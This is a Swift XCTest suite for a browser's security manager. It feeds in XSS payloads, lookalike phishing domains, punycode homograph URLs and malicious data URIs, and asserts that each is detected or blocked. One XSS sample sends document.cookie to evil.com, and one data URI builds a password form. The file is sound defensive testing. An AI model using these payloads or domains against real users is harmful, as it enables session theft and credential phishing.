import XCTest
import WebKit
@testable import PhoenixBrowser

/// Simulated attack tests — verify browser defenses against real-world attack vectors
final class AttackSimulationTests: XCTestCase {

    var sm: SecurityManager!

    override func setUp() {
        super.setUp()
        sm = SecurityManager.shared
        sm.httpsOnlyMode = true
    }

    // =========================================================================
    // MARK: - 1. XSS (Cross-Site Scripting) Attacks
    // =========================================================================

    func testXSS_scriptTag() {
        XCTAssertTrue(sm.containsXSSPayload("<script>alert('xss')</script>"))
    }

    func testXSS_imgOnerror() {
        XCTAssertTrue(sm.containsXSSPayload("<img src=x onerror=alert(1)>"))
    }

    func testXSS_javascriptURI() {
        XCTAssertTrue(sm.containsXSSPayload("javascript:alert(document.cookie)"))
    }

    func testXSS_encodedScript() {
        XCTAssertTrue(sm.containsXSSPayload("%3cscript%3ealert(1)%3c/script%3e"))
    }

    func testXSS_htmlEntity() {
        XCTAssertTrue(sm.containsXSSPayload("&#x3c;script&#x3e;"))
    }

    func testXSS_evalPayload() {
        XCTAssertTrue(sm.containsXSSPayload("eval(atob('YWxlcnQoMSk='))"))
    }

    func testXSS_documentCookie() {
        XCTAssertTrue(sm.containsXSSPayload("new Image().src='http://evil.com/?c='+document.cookie"))
    }

    func testXSS_documentWrite() {
        XCTAssertTrue(sm.containsXSSPayload("document.write('<script src=evil.js>')"))
    }

    func testXSS_onloadEvent() {
        XCTAssertTrue(sm.containsXSSPayload("<body onload=alert(1)>"))
    }

    func testXSS_innerHTMLInjection() {
        XCTAssertTrue(sm.containsXSSPayload("element.innerHTML='<img src=x onerror=alert(1)>'"))
    }

    func testXSS_fromCharCode() {
        XCTAssertTrue(sm.containsXSSPayload("String.fromcharcode(60,115,99,114,105,112,116,62)"))
        // Also test mixed case (lowercased internally)
        XCTAssertTrue(sm.containsXSSPayload("String.FROMCHARCODE(60)"))
    }

    func testXSS_hexEncoded() {
        XCTAssertTrue(sm.containsXSSPayload("\\x3cscript\\x3e"))
    }

    func testXSS_cleanInput_notFlagged() {
        XCTAssertFalse(sm.containsXSSPayload("Hello World"))
        XCTAssertFalse(sm.containsXSSPayload("https://google.com/search?q=swift+tutorial"))
        XCTAssertFalse(sm.containsXSSPayload("normal text with <b>bold</b>"))
    }

    func testXSS_inURL() {
        let url = URL(string: "https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.malware), "XSS in URL should be detected")
    }

    // =========================================================================
    // MARK: - 2. Phishing Attacks
    // =========================================================================

    func testPhishing_fakePayPal() {
        let url = URL(string: "https://secure-paypal-login.com/signin")!
        if case .block = sm.shouldAllowNavigation(to: url) {
            // PASS — blocked
        } else {
            XCTFail("Fake PayPal should be blocked")
        }
    }

    func testPhishing_fakeApple() {
        let url = URL(string: "https://apple-id-verify.com/account")!
        XCTAssertTrue(sm.isBlockedDomain(url))
    }

    func testPhishing_fakeGoogle() {
        let url = URL(string: "https://google-account-verify.com/login")!
        XCTAssertTrue(sm.isBlockedDomain(url))
    }

    func testPhishing_fakeBinance() {
        let url = URL(string: "https://binance-secure-login.com/wallet")!
        XCTAssertTrue(sm.isBlockedDomain(url))
    }

    func testPhishing_allBlocklistedDomains() {
        let phishingDomains = [
            "login-microsoftonline.com",
            "secure-paypal-login.com",
            "apple-id-verify.com",
            "netflix-payment-update.com",
            "amazon-security-alert.com",
            "google-account-verify.com",
            "facebook-login-secure.com",
            "instagram-verify-account.com",
            "binance-secure-login.com",
            "coinbase-verify.com",
        ]
        for domain in phishingDomains {
            let url = URL(string: "https://\(domain)/fake-page")!
            XCTAssertTrue(sm.isBlockedDomain(url), "\(domain) should be blocked")
        }
    }

    func testPhishing_realSites_notBlocked() {
        let realSites = [
            "https://www.paypal.com",
            "https://appleid.apple.com",
            "https://accounts.google.com",
            "https://www.facebook.com",
            "https://www.netflix.com",
            "https://www.amazon.com",
            "https://www.instagram.com",
            "https://www.binance.com",
            "https://www.coinbase.com",
            "https://login.microsoftonline.com",
        ]
        for site in realSites {
            let url = URL(string: site)!
            XCTAssertFalse(sm.isBlockedDomain(url), "\(site) should NOT be blocked (legitimate)")
        }
    }

    // =========================================================================
    // MARK: - 3. Homograph / IDN Attacks
    // =========================================================================

    func testHomograph_cyrillicA_inApple() {
        // When URL contains non-ASCII, it gets punycode-encoded by URL parser
        // Real homograph attack would come as punycode: xn--pple-43d.com
        let url = URL(string: "https://xn--pple-43d.com")!
        XCTAssertTrue(sm.isHomographAttack(url), "Punycode IDN should be detected")
    }

    func testHomograph_mixedCyrillicLatin() {
        // gооgle.com with cyrillic 'о' → punycode
        let url = URL(string: "https://xn--ggle-55da.com")!
        XCTAssertTrue(sm.isHomographAttack(url))
    }

    func testHomograph_punycode() {
        let url = URL(string: "https://xn--80ak6aa92e.com")!
        XCTAssertTrue(sm.isHomographAttack(url))
    }

    func testHomograph_pureLatin_safe() {
        let url = URL(string: "https://apple.com")!
        XCTAssertFalse(sm.isHomographAttack(url))
    }

    func testHomograph_pureAscii_safe() {
        let url = URL(string: "https://github.com")!
        XCTAssertFalse(sm.isHomographAttack(url))
    }

    // =========================================================================
    // MARK: - 4. Suspicious URL Patterns
    // =========================================================================

    func testSuspicious_brandInSubdomain() {
        let url = URL(string: "https://paypal.login.evil-domain.com")!
        XCTAssertTrue(sm.isSuspiciousURL(url), "Brand in subdomain of unrelated domain")
    }

    func testSuspicious_googleSubdomainPhishing() {
        let url = URL(string: "https://google.com.account-verify.evil.com")!
        XCTAssertTrue(sm.isSuspiciousURL(url))
    }

    func testSuspicious_ipAddress() {
        let url = URL(string: "http://192.168.1.100/paypal-login")!
        XCTAssertTrue(sm.isSuspiciousURL(url), "IP address as host is suspicious")
    }

    func testSuspicious_tooManySubdomains() {
        let url = URL(string: "https://a.b.c.d.e.f.evil.com")!
        XCTAssertTrue(sm.isSuspiciousURL(url), ">5 domain levels is suspicious")
    }

    func testSuspicious_veryLongHostname() {
        let long = String(repeating: "a", count: 51) + ".com"
        let url = URL(string: "https://\(long)")!
        XCTAssertTrue(sm.isSuspiciousURL(url), "Very long hostname is suspicious")
    }

    func testSuspicious_atSignInURL() {
        // https://google.com@evil.com — browser shows evil.com but URL looks like google.com
        let url = URL(string: "https://google.com@evil.com/login")!
        if url.user != nil {
            XCTAssertTrue(sm.isSuspiciousURL(url), "@ in URL should be suspicious")
        }
    }

    func testSuspicious_normalURL_notFlagged() {
        let normalURLs = [
            "https://www.google.com",
            "https://docs.github.com/en/pages",
            "https://stackoverflow.com/questions",
            "https://en.wikipedia.org/wiki/Swift",
        ]
        for urlStr in normalURLs {
            let url = URL(string: urlStr)!
            XCTAssertFalse(sm.isSuspiciousURL(url), "\(urlStr) should NOT be flagged")
        }
    }

    // =========================================================================
    // MARK: - 5. Data URI Attacks
    // =========================================================================

    func testDataURI_htmlPhishing() {
        let url = URL(string: "data:text/html,<h1>Enter your password</h1><form><input type=password>")!
        XCTAssertTrue(sm.isMaliciousDataURI(url))
    }

    func testDataURI_base64Html() {
        let url = URL(string: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")!
        XCTAssertTrue(sm.isMaliciousDataURI(url))
    }

    func testDataURI_javascript() {
        let url = URL(string: "data:application/javascript,alert(1)")!
        XCTAssertTrue(sm.isMaliciousDataURI(url))
    }

    func testDataURI_image_safe() {
        let url = URL(string: "data:image/png;base64,iVBORw0KGgoAAAAN")!
        XCTAssertFalse(sm.isMaliciousDataURI(url), "Image data URIs should be safe")
    }

    func testDataURI_notDataURI_safe() {
        let url = URL(string: "https://example.com/data")!
        XCTAssertFalse(sm.isMaliciousDataURI(url))
    }

    // =========================================================================
    // MARK: - 6. SSL Stripping / HTTPS Downgrade Attacks
    // =========================================================================

    func testSSLStrip_httpToHTTPS_upgraded() {
        sm.httpsOnlyMode = true
        let url = URL(string: "http://bank.com/login")!
        if case .upgrade(let secure) = sm.shouldAllowNavigation(to: url) {
            XCTAssertEqual(secure.scheme, "https")
        } else {
            XCTFail("HTTP bank login should be upgraded to HTTPS")
        }
    }

    func testSSLStrip_httpFormSubmission() {
        sm.httpsOnlyMode = true
        let url = URL(string: "http://example.com/submit?password=secret123")!
        if case .upgrade = sm.shouldAllowNavigation(to: url) {
            // PASS — would be upgraded
        } else {
            XCTFail("HTTP form submission should be upgraded")
        }
    }

    func testSSLStrip_mixedAttackPriority() {
        // HTTP + blocked domain → block takes priority
        sm.addBlockedDomain("http-phish.com")
        let url = URL(string: "http://http-phish.com")!
        if case .block(let reason) = sm.shouldAllowNavigation(to: url) {
            XCTAssertEqual(reason, .phishing, "Block should take priority over upgrade")
        } else {
            XCTFail("Should block, not just upgrade")
        }
    }

    // =========================================================================
    // MARK: - 7. Full Security Check (Multiple Threats)
    // =========================================================================

    func testFullCheck_cleanSite() {
        let url = URL(string: "https://github.com")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.isEmpty, "Clean HTTPS site should have no threats")
    }

    func testFullCheck_httpSite() {
        let url = URL(string: "http://example.com")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.httpSite))
    }

    func testFullCheck_blockedDomain() {
        let url = URL(string: "https://login-microsoftonline.com")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.phishing))
    }

    func testFullCheck_multipleThreat_httpAndSuspicious() {
        let url = URL(string: "http://paypal.login.evil.com")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.httpSite), "Should detect HTTP")
        XCTAssertTrue(threats.contains(.unwanted), "Should detect suspicious URL")
    }

    func testFullCheck_dataURIAttack() {
        let url = URL(string: "data:text/html,<script>steal()</script>")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.malware), "Data URI HTML should be detected as malware")
    }

    func testFullCheck_xssInURL() {
        let url = URL(string: "https://example.com/?q=<script>alert(1)</script>")!
        let threats = sm.fullSecurityCheck(for: url)
        XCTAssertTrue(threats.contains(.malware))
    }

    // =========================================================================
    // MARK: - 8. Private Browsing Isolation
    // =========================================================================

    func testPrivateTab_nonPersistentStore() {
        let tab = Tab(isPrivate: true)
        // Non-persistent data store should not be the default
        XCTAssertTrue(tab.isPrivate)
        // The webView's configuration should use non-persistent store
        let isPersistent = tab.webView.configuration.websiteDataStore.isPersistent
        XCTAssertFalse(isPersistent, "Private tab should use non-persistent data store")
    }

    func testRegularTab_persistentStore() {
        let tab = Tab(isPrivate: false)
        let isPersistent = tab.webView.configuration.websiteDataStore.isPersistent
        XCTAssertTrue(isPersistent, "Regular tab should use persistent data store")
    }

    // =========================================================================
    // MARK: - 9. Content Blocking Verification
    // =========================================================================

    func testContentRules_blockTrackers() throws {
        let data = sm.enhancedBlockingRules.data(using: .utf8)!
        let rules = try JSONSerialization.jsonObject(with: data) as! [[String: Any]]

        let trackers = [
            "doubleclick", "facebook", "analytics", "hotjar",
            "mixpanel", "amplitude", "segment", "intercom",
            "taboola", "outbrain", "clarity"
        ]

        let allFilters = rules.compactMap { rule -> String? in
            let trigger = rule["trigger"] as? [String: Any]
            return trigger?["url-filter"] as? String
        }.joined(separator: " ")

        for tracker in trackers {
            XCTAssertTrue(allFilters.contains(tracker), "Missing rule for tracker: \(tracker)")
        }
    }

    func testContentRules_blockPopups() throws {
        let data = sm.enhancedBlockingRules.data(using: .utf8)!
        let rules = try JSONSerialization.jsonObject(with: data) as! [[String: Any]]

        let popupRule = rules.first { rule in
            guard let trigger = rule["trigger"] as? [String: Any],
                  let types = trigger["resource-type"] as? [String] else { return false }
            return types.contains("popup")
        }

        XCTAssertNotNil(popupRule, "Should have a popup blocking rule")
    }

    // =========================================================================
    // MARK: - 10. WKContentRuleList Compilation
    // =========================================================================

    func testContentRules_compileSuccessfully() async throws {
        let ruleList = try await WKContentRuleListStore.default()
            .compileContentRuleList(
                forIdentifier: "TestPhoenixRules",
                encodedContentRuleList: sm.enhancedBlockingRules
            )
        XCTAssertNotNil(ruleList, "Content rules should compile successfully in WebKit")
    }

    // =========================================================================
    // MARK: - 11. Anti-Fingerprint JS Injection Test
    // =========================================================================

    func testAntiFingerprint_executesInWebView() async throws {
        sm.antiFingerprint = true
        let config = WKWebViewConfiguration()
        let script = WKUserScript(
            source: sm.antiFingerprintScript,
            injectionTime: .atDocumentStart,
            forMainFrameOnly: false
        )
        config.userContentController.addUserScript(script)

        let webView = WKWebView(frame: .zero, configuration: config)
        webView.loadHTMLString("<html><body>test</body></html>", baseURL: nil)

        // Wait for load
        try await Task.sleep(nanoseconds: 1_000_000_000)

        // Check screen width is normalized
        let width = try await webView.evaluateJavaScript("screen.width") as? Int
        XCTAssertEqual(width, 1920, "Anti-fingerprint should normalize screen.width to 1920")

        let height = try await webView.evaluateJavaScript("screen.height") as? Int
        XCTAssertEqual(height, 1080, "Anti-fingerprint should normalize screen.height to 1080")

        let cores = try await webView.evaluateJavaScript("navigator.hardwareConcurrency") as? Int
        XCTAssertEqual(cores, 8, "Anti-fingerprint should normalize hardwareConcurrency to 8")
    }
}
